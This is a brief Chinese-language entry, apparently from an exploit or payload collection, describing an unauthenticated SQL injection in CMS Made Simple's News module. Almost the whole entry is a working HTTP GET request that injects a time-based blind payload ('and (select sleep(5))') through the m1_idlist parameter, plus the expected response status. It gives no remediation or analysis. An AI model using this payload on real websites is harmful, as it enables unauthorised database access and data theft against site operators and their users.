# CMSMadeSimple(CMSMS)前台SQL注入漏洞

CMSMadeSimple(CMSMS)前台 ｜ SQL注入 ｜ —
- **请求**：`GET /moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(5))--+ HTTP/1.1`
- **响应特征**：200